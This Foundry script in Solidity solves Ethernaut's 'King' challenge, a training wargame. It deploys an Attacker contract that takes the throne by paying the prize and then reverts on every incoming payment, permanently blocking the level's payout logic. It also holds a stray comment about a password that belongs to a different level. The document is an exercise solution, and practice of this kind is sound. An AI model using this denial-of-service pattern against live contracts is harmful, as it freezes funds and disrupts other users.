// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {King} from "../src/9-King.sol";
import {KingFactory} from "../src/KingFactory.sol";
import {Script, console} from "forge-std/Script.sol";

contract VaultSolution is Script {
    King public kingLevel;
    address payable instanceAddress =
        payable(0x2F77955e2C1c00E348f468fEa76Ae92CB51C0f5D);
    address public publicKey = vm.envAddress("PUBLIC_KEY");

    function run() external {
        kingLevel = King(instanceAddress);

        console.log("Who's the king before attack: %s", kingLevel._king());
        console.log("Balance before attack: %s", instanceAddress.balance);

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        // Password is in clear on the block explorer
        Attacker attacker = new Attacker(kingLevel);
        attacker.attack{value: kingLevel.prize()}();
        vm.stopBroadcast();

        console.log("Who's the king after attack: %s", kingLevel._king());

        validate();
    }

    function validate() internal {
        bool isValidated = new KingFactory().validateInstance(
            instanceAddress,
            publicKey
        );
        console.log("Challenge Completed: %s", isValidated);
    }
}

contract Attacker {
    King level;

    constructor(King _level) {
        level = _level;
    }

    function attack() public payable {
        payable(address(level)).call{value: msg.value}("");
    }

    fallback() external {
        revert();
    }

    receive() external payable {
        revert();
    }
}
